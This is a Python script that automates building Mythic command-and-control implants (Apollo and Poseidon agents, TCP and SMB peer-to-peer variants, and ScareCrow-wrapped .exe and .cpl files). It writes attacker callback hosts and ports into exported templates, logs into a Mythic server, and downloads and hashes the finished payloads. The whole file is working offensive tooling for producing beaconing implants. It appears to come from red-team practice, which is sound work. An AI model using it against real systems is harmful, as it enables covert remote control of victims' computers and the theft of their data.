#!/usr/bin/env python3
"""Build Mythic payloads from exported configuration templates."""

import argparse
import asyncio
import hashlib
import json
import os
import sys
from dataclasses import dataclass
from pathlib import Path
from typing import Any, Optional

SCRIPT_DIR = Path(__file__).resolve().parent


@dataclass(frozen=True)
class PayloadTemplate:
    name: str
    filename: str
    connection: str = "direct"
    wrapped_payload_name: Optional[str] = None
    download: bool = True


TEMPLATES = (
    PayloadTemplate("apollo", "apollo.exe.json"),
    PayloadTemplate("apollo_service", "apollo.bin.json"),
    PayloadTemplate("poseidon", "poseidon.bin.json"),
    PayloadTemplate("apollo_tcp", "apollo-tcp.bin.json", connection="tcp", download=False),
    PayloadTemplate("apollo_tcp_wrapper", "apollo-tcp-wrapped.exe.json", connection="wrapper", wrapped_payload_name="apollo_tcp"),
    PayloadTemplate("apollo_smb", "apollo-smb.bin.json", connection="p2p", download=False),
    PayloadTemplate("apollo_smb_wrapper", "apollo-smb.cpl.json", connection="wrapper", wrapped_payload_name="apollo_smb"),
)


def fail(message: str) -> None:
    print(f"[!] {message}", file=sys.stderr)
    raise SystemExit(1)


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Build payloads from Mythic-exported JSON templates.")
    parser.add_argument("callback_host", nargs="?", help="Callback host, e.g. http://192.168.45.90")
    parser.add_argument("callback_port", nargs="?", type=int, help="Callback port (1-65535)")
    parser.add_argument("mode", nargs="?", default="both", choices=("apollo", "poseidon", "both", "tcp", "smb", "all"))
    parser.add_argument("--mode", dest="selected_mode", choices=("apollo", "poseidon", "both", "tcp", "smb", "all"), help="Build group; allows TCP/SMB builds without callback arguments")
    parser.add_argument("--tcp-port", type=int, help="Listening port for the TCP P2P Apollo payload")
    parser.add_argument("--config-dir", type=Path, default=SCRIPT_DIR, help="Directory containing exported JSON templates")
    parser.add_argument("--output-dir", type=Path, default=Path.cwd() / "payloads", help="Directory for payloads and manifest")
    parser.add_argument("--dry-run", action="store_true", help="Validate and render templates without contacting Mythic")
    args = parser.parse_args()
    if (args.callback_host is None) != (args.callback_port is None):
        parser.error("callback_host and callback_port must be supplied together")
    if args.callback_port is not None and not 1 <= args.callback_port <= 65535:
        parser.error("callback_port must be between 1 and 65535")
    if args.tcp_port is not None and not 1 <= args.tcp_port <= 65535:
        parser.error("--tcp-port must be between 1 and 65535")
    return args


def selected_templates(mode: str) -> tuple[PayloadTemplate, ...]:
    if mode == "apollo":
        return tuple(template for template in TEMPLATES if template.name.startswith("apollo"))
    if mode == "poseidon":
        return tuple(template for template in TEMPLATES if template.name == "poseidon")
    if mode == "tcp":
        return tuple(template for template in TEMPLATES if template.name in ("apollo_tcp", "apollo_tcp_wrapper"))
    if mode == "smb":
        return tuple(template for template in TEMPLATES if template.name in ("apollo_smb", "apollo_smb_wrapper"))
    if mode == "all":
        return TEMPLATES
    return tuple(template for template in TEMPLATES if template.name in ("apollo", "apollo_service", "poseidon"))


def load_payload_config(path: Path) -> dict[str, Any]:
    try:
        data = json.loads(path.read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError) as exc:
        fail(f"Could not load template {path}: {exc}")
    required = ("filename", "payload_type", "selected_os")
    missing = [key for key in required if not data.get(key)]
    if missing:
        fail(f"Template {path} is missing required fields: {', '.join(missing)}")
    if "c2_profiles" not in data or not isinstance(data["c2_profiles"], list):
        fail(f"Template {path} must contain a C2 profile list")
    if data["payload_type"] != "scarecrow_wrapper" and not data["c2_profiles"]:
        fail(f"Template {path} must contain at least one C2 profile")
    return data


def render_callback(cfg: dict[str, Any], callback_host: str, callback_port: int) -> int:
    """Update direct C2 profiles while leaving P2P template settings untouched."""
    updated = 0
    for profile in cfg["c2_profiles"]:
        if profile.get("c2_profile_is_p2p"):
            continue
        parameters = profile.get("c2_profile_parameters")
        if not isinstance(parameters, dict):
            fail(f"Payload {cfg['filename']} has a malformed C2 profile")
        parameters["callback_host"] = callback_host
        parameters["callback_port"] = callback_port
        updated += 1
    if not updated:
        fail(f"Payload {cfg['filename']} has no direct C2 profile to update")
    return updated


def render_tcp_port(cfg: dict[str, Any], tcp_port: int) -> None:
    for profile in cfg["c2_profiles"]:
        if profile.get("c2_profile") == "tcp":
            parameters = profile.get("c2_profile_parameters")
            if not isinstance(parameters, dict):
                fail(f"Payload {cfg['filename']} has a malformed TCP C2 profile")
            parameters["port"] = str(tcp_port)
            cfg["filename"] = f"apollo-tcp-{tcp_port}.bin"
            return
    fail(f"Payload {cfg['filename']} has no TCP C2 profile")


def mythic_settings() -> dict[str, Any]:
    password = os.environ.get("MYTHIC_PASSWORD")
    if not password:
        fail("Set MYTHIC_PASSWORD before building (it is intentionally not stored in this repository)")
    try:
        port = int(os.environ.get("MYTHIC_SERVER_PORT", "7443"))
        timeout = int(os.environ.get("MYTHIC_TIMEOUT", "-1"))
    except ValueError:
        fail("MYTHIC_SERVER_PORT and MYTHIC_TIMEOUT must be integers")
    return {"username": os.environ.get("MYTHIC_USERNAME", "mythic_admin"), "password": password,
            "server_ip": os.environ.get("MYTHIC_SERVER_IP", "127.0.0.1"), "server_port": port, "timeout": timeout}


async def create_payload(client: Any, cfg: dict[str, Any], wrapped_payload_uuid: Optional[str] = None) -> dict[str, Any]:
    from mythic import mythic

    print(f"[*] Creating {cfg['filename']} ({cfg['payload_type']})")
    if wrapped_payload_uuid:
        response = await mythic.create_wrapper_payload(mythic=client, payload_type_name=cfg["payload_type"], filename=cfg["filename"],
            operating_system=cfg["selected_os"], wrapped_payload_uuid=wrapped_payload_uuid,
            build_parameters=cfg.get("build_parameters", []), return_on_complete=True)
    else:
        response = await mythic.create_payload(mythic=client, payload_type_name=cfg["payload_type"], filename=cfg["filename"],
            operating_system=cfg["selected_os"], commands=cfg.get("commands", []), c2_profiles=cfg["c2_profiles"],
            build_parameters=cfg.get("build_parameters", []), return_on_complete=True)
    if not isinstance(response, dict) or not response.get("uuid"):
        fail(f"Mythic did not return a completed payload UUID for {cfg['filename']}: {response}")
    return response


async def download_payload(client: Any, response: dict[str, Any], cfg: dict[str, Any], output_dir: Path) -> dict[str, str]:
    from mythic import mythic

    payload_bytes = await mythic.download_payload(mythic=client, payload_uuid=response["uuid"])
    if not payload_bytes:
        fail(f"Mythic returned an empty payload for {cfg['filename']}")
    filename = Path(response.get("filename") or response.get("file_name") or cfg["filename"]).name
    output_path = output_dir / filename
    output_path.write_bytes(payload_bytes)
    digest = hashlib.sha256(payload_bytes).hexdigest()
    print(f"[+] Saved {output_path} (sha256: {digest})")
    return {"filename": filename, "sha256": digest, "uuid": response["uuid"]}


async def main() -> None:
    args = parse_args()
    mode = args.selected_mode or args.mode
    templates = selected_templates(mode)
    needs_callback = any(template.connection == "direct" for template in templates)
    if needs_callback and args.callback_host is None:
        fail("This build group requires callback_host and callback_port")
    if any(template.connection == "tcp" for template in templates) and args.tcp_port is None:
        fail("TCP builds require --tcp-port")
    configs: list[tuple[PayloadTemplate, dict[str, Any]]] = []
    for template in templates:
        config = load_payload_config((args.config_dir / template.filename).resolve())
        if template.connection == "direct":
            count = render_callback(config, args.callback_host, args.callback_port)
            print(f"[*] Rendered {template.name}: {count} direct C2 profile(s)")
        elif template.connection == "tcp":
            render_tcp_port(config, args.tcp_port)
            print(f"[*] Rendered {template.name}: TCP port {args.tcp_port}")
        elif template.name == "apollo_tcp_wrapper":
            config["filename"] = f"apollo-tcp-{args.tcp_port}-wrapped.exe"
            print(f"[*] Rendered {template.name}: apollo-tcp-{args.tcp_port}-wrapped.exe")
        else:
            print(f"[*] Loaded {template.name}")
        configs.append((template, config))
    if args.dry_run:
        print("[+] Dry run completed; Mythic was not contacted.")
        return
    output_dir = args.output_dir.resolve()
    output_dir.mkdir(parents=True, exist_ok=True)
    try:
        from mythic import mythic

        client = await mythic.login(**mythic_settings())
    except ImportError:
        fail("The Mythic Python client is not installed; run scripts/generate.sh or install requirements.txt")
    except Exception as exc:
        fail(f"Could not log in to Mythic: {exc}")
    manifest: dict[str, Any] = {"mode": mode, "callback_host": args.callback_host, "callback_port": args.callback_port, "tcp_port": args.tcp_port, "payloads": {}}
    completed: dict[str, dict[str, Any]] = {}
    for template, config in configs:
        try:
            parent = completed.get(template.wrapped_payload_name) if template.wrapped_payload_name else None
            if template.wrapped_payload_name and parent is None:
                fail(f"Wrapper {template.name} is missing its required payload {template.wrapped_payload_name}")
            response = await create_payload(client, config, parent["uuid"] if parent else None)
            record: dict[str, Any] = {"uuid": response["uuid"], "filename": config["filename"]}
            if template.download:
                record.update(await download_payload(client, response, config, output_dir))
            else:
                print(f"[+] Built {config['filename']} for wrapper input; raw payload was not downloaded")
            completed[template.name] = record
            manifest["payloads"][template.name] = record
        except Exception as exc:
            fail(f"Build failed for {template.name}: {exc}")
    manifest_path = output_dir / "build-manifest.json"
    manifest_path.write_text(json.dumps(manifest, indent=2) + "\n", encoding="utf-8")
    print(f"[+] Wrote {manifest_path}")


if __name__ == "__main__":
    asyncio.run(main())
